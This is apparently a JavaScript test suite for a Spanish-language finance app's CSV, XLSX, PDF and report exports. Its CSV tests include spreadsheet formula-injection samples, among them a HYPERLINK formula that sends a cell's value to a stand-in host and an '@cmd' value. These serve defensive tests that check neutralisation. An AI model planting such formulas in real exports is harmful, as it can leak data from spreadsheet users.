import test from 'node:test';
import assert from 'node:assert/strict';
import { buildDemoData } from '../src/domain/demo.js';
import { defaultCategories } from '../src/domain/categories.js';
import { crc32, buildZip } from '../src/export/zip.js';
import { csvCell, neutralizeFormula, reportToCsv, toCsv } from '../src/export/csv.js';
import { columnLetter, excelDateSerial, reportToXlsx, safeSheetName, xmlEscape } from '../src/export/xlsx.js';
import { buildPdf, textWidth, winAnsiCode, wrapText } from '../src/export/pdf.js';
import { cellText, centsToPlain, date, int, money, pct, slugify } from '../src/export/model.js';
import { makeFile } from '../src/export/index.js';
import { amortizationReport, debtsReport, monthReport, netWorthReport } from '../src/export/reports.js';
import { netWorthSummary } from '../src/domain/netWorth.js';
import { debtPortfolio } from '../src/domain/debts.js';

const today = '2026-07-20';
const decoder = new TextDecoder();

/** Lee un ZIP "sin comprimir" y devuelve sus archivos (comprueba también los CRC). @param {Uint8Array} zip */
function readZip(zip) {
  const dv = new DataView(zip.buffer, zip.byteOffset, zip.byteLength);
  const end = zip.length - 22;
  assert.equal(dv.getUint32(end, true), 0x06054b50, 'fin del directorio central');
  const count = dv.getUint16(end + 10, true);
  let pos = dv.getUint32(end + 16, true);
  /** @type {Record<string, string>} */
  const files = {};
  for (let i = 0; i < count; i += 1) {
    assert.equal(dv.getUint32(pos, true), 0x02014b50);
    const crc = dv.getUint32(pos + 16, true);
    const size = dv.getUint32(pos + 20, true);
    const nameLen = dv.getUint16(pos + 28, true);
    const local = dv.getUint32(pos + 42, true);
    const name = decoder.decode(zip.subarray(pos + 46, pos + 46 + nameLen));
    const start = local + 30 + dv.getUint16(local + 26, true) + dv.getUint16(local + 28, true);
    const data = zip.subarray(start, start + size);
    assert.equal(crc32(data), crc, `CRC de ${name}`);
    files[name] = decoder.decode(data);
    pos += 46 + nameLen;
  }
  return files;
}

function sampleData() {
  const demo = buildDemoData(today, '2026-07-20T12:00:00.000Z');
  return {
    categories: defaultCategories(),
    settings: { displayName: '', openingBalanceCents: 100_000 },
    movements: demo.movements, goals: demo.goals, contributions: demo.contributions,
    debts: demo.debts, debtPayments: demo.debtPayments, assets: demo.assets, clients: [], services: [], products: [], suppliers: [], stockEntries: [], invoices: [], invoicePayments: [], departments: [],
  };
}

// ------------------------------------------------------------------ zip

test('CRC-32: valor de referencia estándar ("123456789" = CBF43926)', () => {
  assert.equal(crc32(new TextEncoder().encode('123456789')), 0xcbf43926);
});

test('ZIP: se puede leer de vuelta con nombres y contenido intactos (UTF-8 incluido)', () => {
  const zip = buildZip([{ name: 'a/b.txt', data: 'hola ñandú' }, { name: 'c.bin', data: Uint8Array.from([0, 1, 2, 255]) }]);
  const files = readZip(zip);
  assert.equal(files['a/b.txt'], 'hola ñandú');
  assert.deepEqual(Object.keys(files), ['a/b.txt', 'c.bin']);
});

// ------------------------------------------------------------------ modelo

test('formatos de celda y montos planos', () => {
  assert.equal(cellText(money(123_450)), 'RD$ 1,234.50');
  assert.equal(cellText(date('2026-07-05')), '5 jul 2026');
  assert.equal(cellText(int(7)), '7');
  assert.equal(cellText(pct(22.84)), '22.8 %');
  assert.equal(cellText(null), '');
  assert.equal(centsToPlain(123_450), '1234.50');
  assert.equal(centsToPlain(-5), '-0.05');
  assert.equal(centsToPlain(0), '0.00');
  assert.equal(slugify('Préstamo del Banco #1'), 'prestamo-del-banco-1');
});

// ------------------------------------------------------------------ CSV

test('CSV: todo texto va entre comillas, las comillas internas se duplican; empieza con BOM y usa CRLF', () => {
  const csv = toCsv(['Texto', 'Monto'], [['dijo "hola", y salió\nya', money(150)], ['simple', money(-2_000_000)]]);
  assert.ok(csv.startsWith('﻿"Texto","Monto"\r\n'));
  assert.ok(csv.includes('"dijo ""hola"", y salió\nya",1.50\r\n'));
  assert.ok(csv.includes('"simple",-20000.00\r\n'), 'los montos siguen siendo números sin comillas');
});

test('CSV: un «;» no puede partir el texto en una celda con fórmula (Excel con separador «;»)', () => {
  assert.equal(csvCell('x;=1+1'), '"x;=1+1"');
  assert.equal(csvCell('Pago;=HYPERLINK("https://x/?d="&B2;"Ver")'), '"Pago;=HYPERLINK(""https://x/?d=""&B2;""Ver"")"');
  assert.equal(csvCell('a\t=1+1'), '"a\t=1+1"');
  const csv = toCsv(['Descripción'], [['Pago;=1+1']]);
  assert.ok(csv.includes('\r\n"Pago;=1+1"\r\n'), 'la fila entera queda dentro de comillas');
});

test('CSV: un texto que parece fórmula se neutraliza (Excel no lo ejecuta)', () => {
  for (const evil of ['=1+1', '+SUMA(A1)', '-2+3', '@cmd', '\tx', '=HYPERLINK("http://x")']) {
    assert.ok(neutralizeFormula(evil).startsWith("'"), evil);
  }
  assert.equal(neutralizeFormula('Café'), 'Café');
  assert.equal(csvCell('=2+2'), `"'=2+2"`);
  assert.equal(csvCell(money(-100)), '-1.00', 'un monto negativo es un número, no un texto');
});

// ------------------------------------------------------------------ Excel

test('XLSX: columnas, fechas y nombres de hoja', () => {
  assert.equal(columnLetter(0), 'A');
  assert.equal(columnLetter(25), 'Z');
  assert.equal(columnLetter(26), 'AA');
  assert.equal(columnLetter(701), 'ZZ');
  assert.equal(columnLetter(702), 'AAA');
  assert.equal(excelDateSerial('1900-03-01'), 61);
  assert.equal(excelDateSerial('2026-07-20'), 46223);
  const used = new Set();
  assert.equal(safeSheetName('Resumen', used), 'Resumen');
  assert.equal(safeSheetName('resumen', used), 'resumen 2');
  assert.equal(safeSheetName('a/b:c*d?[e]\\f', new Set()), 'a b c d e f');
  assert.equal(safeSheetName('x'.repeat(50), new Set()).length, 31);
  assert.equal(xmlEscape('a<b>&"c\u0001'), 'a&lt;b&gt;&amp;&quot;c');
});

test('XLSX: contiene todas las partes, no tiene fórmulas y escapa el XML', () => {
  const report = {
    title: 'Prueba <&>', subtitle: 'sub', notes: ['nota'], fileBase: 'x', csvSheet: 'Hoja',
    sheets: [{ name: 'Hoja', blocks: [{ type: 'table', headers: ['A', 'B', 'C', 'D'], rows: [['=1+1 <b>', money(1250), date('2026-07-05'), int(3)]], totals: ['Total', money(1250), null, null] }] }],
  };
  const files = readZip(reportToXlsx(report));
  for (const name of ['[Content_Types].xml', '_rels/.rels', 'xl/workbook.xml', 'xl/_rels/workbook.xml.rels', 'xl/styles.xml', 'xl/worksheets/sheet1.xml']) {
    assert.ok(name in files, name);
  }
  const sheet = files['xl/worksheets/sheet1.xml'];
  assert.ok(!sheet.includes('<f>'), 'sin fórmulas');
  assert.ok(sheet.includes('=1+1 &lt;b&gt;'), 'el texto se guarda como texto y escapado');
  assert.ok(sheet.includes('<v>12.50</v>'), 'monto exacto');
  assert.ok(sheet.includes('<v>46208</v>'), 'fecha real');
});

// ------------------------------------------------------------------ PDF

test('PDF: codificación WinAnsi y medidas de Helvetica', () => {
  assert.equal(winAnsiCode('A'), 65);
  assert.equal(winAnsiCode('ñ'), 241);
  assert.equal(winAnsiCode('á'), 225);
  assert.equal(winAnsiCode('¿'), 191);
  assert.equal(winAnsiCode('€'), 0x80);
  assert.equal(winAnsiCode('—'), 0x97);
  assert.equal(winAnsiCode('😀'), 63, 'lo que no existe sale como ?');
  assert.equal(winAnsiCode('中'), 63);
  assert.equal(winAnsiCode('−'), 45, 'el signo menos se escribe como guion');
  // H(722)+e(556)+l(222)+l(222)+o(556) = 2278 milésimas -> 22.78 pt a tamaño 10
  assert.ok(Math.abs(textWidth('Hello', 10) - 22.78) < 0.001);
  assert.ok(textWidth('Hello', 10, true) > textWidth('Hello', 10), 'la negrita es más ancha');
});

test('PDF: el texto largo se parte en líneas que caben', () => {
  const lines = wrapText('uno dos tres cuatro cinco seis siete ocho nueve diez', 80, 10);
  assert.ok(lines.length > 1);
  for (const l of lines) assert.ok(textWidth(l, 10) <= 80.001, l);
  assert.equal(lines.join(' '), 'uno dos tres cuatro cinco seis siete ocho nueve diez');
  const word = wrapText('x'.repeat(200), 100, 10);
  for (const l of word) assert.ok(textWidth(l, 10) <= 100.001);
  assert.equal(word.join(''), 'x'.repeat(200));
  assert.deepEqual(wrapText('', 100, 10), ['']);
});

/** Comprueba la estructura de un PDF: cabecera, tabla xref con offsets correctos y %%EOF. @param {Uint8Array} pdf */
function checkPdfStructure(pdf) {
  const text = Buffer.from(pdf).toString('latin1');
  assert.ok(text.startsWith('%PDF-1.4'));
  assert.ok(text.trimEnd().endsWith('%%EOF'));
  const start = Number(/startxref\n(\d+)\n%%EOF/.exec(text)?.[1]);
  assert.ok(text.slice(start).startsWith('xref'), 'startxref apunta a xref');
  const entries = [...text.slice(start).matchAll(/^(\d{10}) 00000 n $/gm)].map((m) => Number(m[1]));
  assert.ok(entries.length >= 6);
  entries.forEach((offset, i) => assert.ok(text.slice(offset).startsWith(`${i + 1} 0 obj`), `objeto ${i + 1} en su offset`));
  // Cada /Length coincide con el flujo real.
  for (const m of text.matchAll(/<< \/Length (\d+) >>\nstream\n([\s\S]*?)\nendstream/g)) assert.equal(Number(m[1]), m[2].length);
  return text;
}

test('PDF: estructura válida, varias páginas con pie "Página X de N"', () => {
  const rows = Array.from({ length: 120 }, (_, i) => [date('2026-07-05'), `Movimiento número ${i + 1} con ñ y tildes áéíóú`, money(i * 100)]);
  const report = {
    title: 'Reporte grande', subtitle: 'sub', notes: ['Una nota importante'], fileBase: 'x', csvSheet: 'H',
    sheets: [{ name: 'H', blocks: [{ type: 'table', headers: ['Fecha', 'Descripción', 'Monto'], rows }] }],
  };
  const pdf = buildPdf(report, { generatedAt: new Date(Date.UTC(2026, 6, 20, 15, 30)) });
  const text = checkPdfStructure(pdf);
  const pages = Number(/\/Count (\d+)/.exec(text)?.[1]);
  assert.ok(pages >= 3, `páginas: ${pages}`);
  assert.equal([...text.matchAll(/\/Type \/Page /g)].length, pages);
});

test('PDF: un texto con paréntesis, barras y emojis no rompe el archivo', () => {
  const report = {
    title: 'Raro (paréntesis) \\ y 😀', subtitle: '', notes: [], fileBase: 'x', csvSheet: 'H',
    sheets: [{ name: 'H', blocks: [{ type: 'text', text: ') ( \\ << >> endstream 😀' }, { type: 'pairs', rows: [['a)b', 'c(d']] }] }],
  };
  checkPdfStructure(buildPdf(report, { generatedAt: new Date(0) }));
});

/** Tamaños de página (MediaBox) de cada página del PDF. @param {string} pdfText */
function mediaBoxes(pdfText) {
  return [...pdfText.matchAll(/\/MediaBox \[0 0 ([\d.]+) ([\d.]+)\]/g)].map((m) => [Number(m[1]), Number(m[2])]);
}

test('PDF: una tabla ancha pasa el documento a hoja horizontal; una estrecha lo deja vertical', () => {
  const narrow = {
    title: 'Estrecha', subtitle: '', notes: [], fileBase: 'x', csvSheet: 'H',
    sheets: [{ name: 'H', blocks: [{ type: 'table', headers: ['Fecha', 'Monto'], rows: [[date('2026-07-05'), money(100)]] }] }],
  };
  const wide = {
    title: 'Ancha', subtitle: '', notes: [], fileBase: 'x', csvSheet: 'H',
    sheets: [{
      name: 'H',
      blocks: [{
        type: 'table',
        headers: Array.from({ length: 12 }, (_, i) => `Columna ${i + 1}`),
        rows: [Array.from({ length: 12 }, () => money(123456789))],
      }],
    }],
  };
  const portrait = mediaBoxes(checkPdfStructure(buildPdf(narrow, { generatedAt: new Date(0) })));
  const landscape = mediaBoxes(checkPdfStructure(buildPdf(wide, { generatedAt: new Date(0) })));
  assert.ok(portrait.every(([w, h]) => w < h), 'vertical');
  assert.ok(landscape.every(([w, h]) => w > h), 'horizontal');
});

test('PDF: una palabra larguísima no obliga a cambiar la orientación', () => {
  const report = {
    title: 'Palabra larga', subtitle: '', notes: [], fileBase: 'x', csvSheet: 'H',
    sheets: [{ name: 'H', blocks: [{ type: 'table', headers: ['Fecha', 'Descripción', 'Monto'], rows: [[date('2026-07-05'), 'x'.repeat(200), money(100)]] }] }],
  };
  assert.ok(mediaBoxes(checkPdfStructure(buildPdf(report, { generatedAt: new Date(0) }))).every(([w, h]) => w < h));
});

test('PDF: una tabla sin filas dice "No hay registros" en vez de dejar solo el encabezado', () => {
  const report = {
    title: 'Vacía', subtitle: '', notes: [], fileBase: 'x', csvSheet: 'H',
    sheets: [{ name: 'H', blocks: [{ type: 'table', headers: ['Fecha', 'Monto'], rows: [] }] }],
  };
  const text = checkPdfStructure(buildPdf(report, { generatedAt: new Date(0) }));
  const hex = (/** @type {string} */ t) => Buffer.from(t, 'latin1').toString('hex');
  assert.ok(text.includes(hex('No hay registros.')));
  assert.ok(!text.includes(hex('Fecha')), 'no se dibuja el encabezado');
});

// ------------------------------------------------------------------ reportes

test('reporte del mes: resumen, movimientos con signo y marca DEMO', () => {
  const data = sampleData();
  const r = monthReport(data, '2026-06', today);
  assert.equal(r.fileBase, 'accontrol-reporte-2026-06');
  assert.ok(r.notes[0].includes('datos de demostración'));
  const names = r.sheets.map((s) => s.name);
  assert.deepEqual(names, ['Resumen', 'Movimientos']);
  const table = r.sheets[1].blocks[0];
  assert.equal(table.type, 'table');
  if (table.type !== 'table') return;
  assert.ok(table.rows.length > 5);
  for (const row of table.rows) {
    assert.ok(String(row[0]?.date).startsWith('2026-06'));
    assert.equal(row[7], 'DEMO', 'todo es demostración');
  }
  const incomes = table.rows.filter((row) => row[2] === 'Ingreso');
  assert.ok(incomes.every((row) => row[6].money > 0));
  const expenses = table.rows.filter((row) => row[2] === 'Gasto');
  assert.ok(expenses.every((row) => row[6].money < 0));

  const csv = reportToCsv(r);
  assert.ok(csv.startsWith('﻿"Fecha","Hora","Tipo","Categoría"'));
  assert.equal(csv.trimEnd().split('\r\n').length, table.rows.length + 1);
});

test('reporte sin datos de demostración no lleva la nota DEMO', () => {
  const data = sampleData();
  data.movements = data.movements.filter((m) => !m.isDemo);
  data.goals = []; data.contributions = []; data.debts = []; data.debtPayments = []; data.assets = [];
  assert.deepEqual(monthReport(data, '2026-06', today).notes, []);
});

test('reporte del mes: los totales del resumen coinciden con la suma de los movimientos', () => {
  const data = sampleData();
  const r = monthReport(data, '2026-06', today);
  const pairs = r.sheets[0].blocks[0];
  const table = r.sheets[1].blocks[0];
  if (pairs.type !== 'pairs' || table.type !== 'table') return assert.fail('forma');
  const income = pairs.rows[0][1].money;
  const expense = pairs.rows[1][1].money;
  const sumIncome = table.rows.filter((row) => row[2] === 'Ingreso').reduce((s, row) => s + row[6].money, 0);
  const sumExpense = table.rows.filter((row) => row[2] === 'Gasto').reduce((s, row) => s - row[6].money, 0);
  assert.equal(income, sumIncome);
  assert.equal(expense, sumExpense);
});

test('reporte de deudas y de amortización', () => {
  const data = sampleData();
  const d = debtsReport(data, today);
  assert.deepEqual(d.sheets.map((s) => s.name), ['Resumen', 'Deudas', 'Pagos']);
  const debtsTable = d.sheets[1].blocks[0];
  assert.equal(debtsTable.type, 'table');
  if (debtsTable.type === 'table') assert.equal(debtsTable.rows.length, data.debts.length);

  const item = debtPortfolio(data, today).items.find((i) => !i.status.paid);
  assert.ok(item);
  const a = amortizationReport(item, today);
  const sched = a.sheets[1].blocks[0];
  if (sched.type !== 'table') return assert.fail('forma');
  assert.equal(sched.rows.length, item.status.remaining.length);
  // El total de capital de la tabla es exactamente lo que se debe hoy.
  assert.equal(sched.totals?.[4]?.money, item.status.balanceCents);
  assert.equal(a.fileBase, 'accontrol-amortizacion-' + a.fileBase.split('accontrol-amortizacion-')[1]);
});

test('reporte de patrimonio: coincide con el cálculo de la pantalla y marca lo de demostración', () => {
  const data = sampleData();
  const r = netWorthReport(data, today);
  assert.deepEqual(r.sheets.map((s) => s.name), ['Resumen', 'Activos', 'Deudas', 'Evolución']);
  assert.equal(r.csvSheet, 'Evolución');
  assert.equal(r.fileBase, 'accontrol-patrimonio-' + today);
  assert.ok(r.notes.length > 0, 'con datos de demostración debe llevar la nota');

  const summary = netWorthSummary(data, today);
  const pairs = r.sheets[0].blocks[0];
  if (pairs.type !== 'pairs') return assert.fail('forma');
  assert.equal(pairs.rows[0][1].money, summary.now.netWorthCents);
  assert.equal(pairs.rows[1][1].money, summary.now.assetsCents);
  assert.equal(pairs.rows[5][1].money, summary.now.liabilitiesCents);
  // Patrimonio = activos - pasivos, también en el reporte.
  assert.equal(pairs.rows[1][1].money - pairs.rows[5][1].money, pairs.rows[0][1].money);
  // Activos del dinero + activos manuales = activos totales.
  assert.equal(pairs.rows[2][1].money + pairs.rows[3][1].money + pairs.rows[4][1].money, pairs.rows[1][1].money);

  const assetsTable = r.sheets[1].blocks[0];
  const evolution = r.sheets[3].blocks[0];
  if (assetsTable.type !== 'table' || evolution.type !== 'table') return assert.fail('forma');
  assert.equal(assetsTable.rows.length, data.assets.length);
  assert.equal(assetsTable.totals?.[4]?.money, summary.now.assetsManualCents);
  assert.equal(evolution.rows.length, summary.series.length);
  const last = evolution.rows[evolution.rows.length - 1];
  assert.equal(last[3].money, summary.now.netWorthCents);

  // Sin nada de demostración, no hay nota.
  data.movements = data.movements.filter((m) => !m.isDemo);
  data.goals = []; data.contributions = []; data.debts = []; data.debtPayments = []; data.assets = [];
  assert.deepEqual(netWorthReport(data, today).notes, []);
  // Un solo activo de demostración basta para que aparezca la nota.
  const withDemoAsset = { ...sampleData(), movements: [], goals: [], contributions: [], debts: [], debtPayments: [] };
  assert.ok(netWorthReport(withDemoAsset, today).notes.length > 0);
});

test('reporte de patrimonio: sin activos ni deudas se exporta sin romperse en los tres formatos', () => {
  const empty = {
    categories: defaultCategories(), settings: { displayName: '', openingBalanceCents: 0 },
    movements: [], goals: [], contributions: [], debts: [], debtPayments: [], assets: [], clients: [], services: [], products: [], suppliers: [], stockEntries: [], invoices: [], invoicePayments: [], departments: [],
  };
  const r = netWorthReport(empty, today);
  const now = new Date(Date.UTC(2026, 6, 20, 12));
  for (const format of /** @type {const} */ (['csv', 'xlsx', 'pdf'])) {
    const f = makeFile(r, format, now);
    assert.ok(f.bytes.length > 20, format);
    assert.ok(f.filename.startsWith('accontrol-patrimonio-2026-07-20.'), f.filename);
  }
});

test('makeFile genera los tres formatos con el nombre y tipo correctos', () => {
  const data = sampleData();
  const r = monthReport(data, '2026-06', today);
  const now = new Date(Date.UTC(2026, 6, 20, 12));
  const csv = makeFile(r, 'csv', now);
  const xlsx = makeFile(r, 'xlsx', now);
  const pdf = makeFile(r, 'pdf', now);
  assert.equal(csv.filename, 'accontrol-reporte-2026-06.csv');
  assert.equal(xlsx.filename, 'accontrol-reporte-2026-06.xlsx');
  assert.equal(pdf.filename, 'accontrol-reporte-2026-06.pdf');
  assert.equal(String.fromCharCode(...xlsx.bytes.subarray(0, 2)), 'PK');
  assert.equal(String.fromCharCode(...pdf.bytes.subarray(0, 5)), '%PDF-');
  assert.ok(csv.mime.startsWith('text/csv'));
  // Determinista: el mismo reporte da exactamente el mismo archivo.
  assert.deepEqual(makeFile(r, 'xlsx', now).bytes, xlsx.bytes);
  assert.deepEqual(makeFile(r, 'pdf', now).bytes, pdf.bytes);
});

// ------------------------------------------------------------------ clientes (Freelancer)

test('reporte de clientes: coincide con las cuentas de la pantalla y se exporta en los tres formatos', async () => {
  const { buildFreelancerDemo } = await import('../src/domain/demo.js');
  const { clientCosts, clientSummaries, receivables } = await import('../src/domain/freelance.js');
  const { clientsReport } = await import('../src/export/reports.js');
  const fl = buildFreelancerDemo(today, '2026-07-20T12:00:00.000Z');
  const data = { ...sampleData(), movements: fl.movements, clients: fl.clients, services: fl.services };
  const r = clientsReport(data, today);

  assert.equal(r.title, 'Reporte de clientes');
  assert.equal(r.fileBase, 'accontrol-clientes-2026-07-20');
  assert.equal(r.csvSheet, 'Clientes');
  assert.ok(r.notes.some((n) => /demostración/.test(n)), 'avisa que hay datos de demostración');
  assert.deepEqual(r.sheets.map((s) => s.name), ['Resumen', 'Clientes', 'Servicios', 'Pagos', 'Gastos de clientes']);

  const table = (/** @type {string} */ name) => /** @type {any} */ (r.sheets.find((s) => s.name === name)?.blocks.find((b) => b.type === 'table'));
  const clients = table('Clientes');
  assert.equal(clients.rows.length, 4);
  // El total por cobrar del reporte es el de la pantalla.
  const owed = receivables(data, today).totalCents;
  assert.deepEqual(clients.totals[16], { money: owed });
  assert.equal(clients.rows.reduce((sum, row) => sum + row[16].money, 0), owed);
  // Cobrado este año por cliente = la cuenta del dominio.
  const byName = Object.fromEntries(clientSummaries(data, { range: 'year', today }).map((x) => [`${x.client.firstName} ${x.client.lastName}`, x.incomeCents]));
  for (const row of clients.rows) assert.equal(row[7].money, byName[row[0]], row[0]);
  assert.ok(clients.rows.every((row) => row.at(-1) === 'DEMO'));
  // Cada pago listado es un ingreso vinculado, y la suma coincide con lo cobrado de todo el tiempo.
  const payments = table('Pagos');
  assert.ok(payments.rows.length >= 8);
  assert.equal(payments.rows.reduce((sum, row) => sum + row[5].money, 0), clients.rows.reduce((sum, row) => sum + row[11].money, 0));
  assert.equal(table('Servicios').rows.length, data.services.length);
  // Rentabilidad: gastos cargados, neto y margen de cada cliente salen de las mismas cuentas que la pantalla.
  const summaries = Object.fromEntries(clientSummaries(data, { range: 'year', today }).map((x) => [`${x.client.firstName} ${x.client.lastName}`, x]));
  for (const row of clients.rows) {
    const s = summaries[row[0]];
    assert.equal(row[8].money, s.expenseCents, `gastos de ${row[0]}`);
    assert.equal(row[9].money, s.netCents, `neto de ${row[0]}`);
    assert.equal(row[9].money, row[7].money - row[8].money, `neto = cobrado − gastos de ${row[0]}`);
  }
  assert.ok(clients.rows.some((row) => row[8].money > 0), 'la demostración trae gastos cargados a clientes');
  const costRows = table('Gastos de clientes');
  const assigned = clientCosts(data, { range: 'all', today }).assignedCents;
  assert.equal(costRows.rows.reduce((sum, row) => sum + row[4].money, 0), assigned, 'la hoja de gastos suma lo cargado a clientes');
  assert.equal(clients.totals[12].money, assigned, 'el total de gastos de todo el tiempo coincide');
  assert.equal(clients.totals[13].money, clients.totals[11].money - clients.totals[12].money);

  const now = new Date(Date.UTC(2026, 6, 20, 12));
  for (const format of /** @type {const} */ (['csv', 'xlsx', 'pdf'])) {
    const f = makeFile(r, format, now);
    assert.ok(f.bytes.length > 100, format);
    assert.ok(f.filename.startsWith('accontrol-clientes-2026-07-20.'), f.filename);
  }
  const csv = decoder.decode(makeFile(r, 'csv', now).bytes);
  assert.match(csv, /Ana Pérez/);
  assert.match(csv, /Cobrado este año/);
  assert.match(csv, /Gastos cargados este año/);
});

test('reporte de clientes: sin clientes se exporta sin romperse y sin nota DEMO', async () => {
  const { clientsReport } = await import('../src/export/reports.js');
  const r = clientsReport(sampleData2(), today);
  assert.deepEqual(r.notes, []);
  const now = new Date(Date.UTC(2026, 6, 20, 12));
  for (const format of /** @type {const} */ (['csv', 'xlsx', 'pdf'])) assert.ok(makeFile(r, format, now).bytes.length > 20, format);
});

function sampleData2() {
  return { categories: defaultCategories(), settings: { displayName: '', openingBalanceCents: 0 }, movements: [], goals: [], contributions: [], debts: [], debtPayments: [], assets: [], clients: [], services: [], products: [], suppliers: [], stockEntries: [], invoices: [], invoicePayments: [] };
}
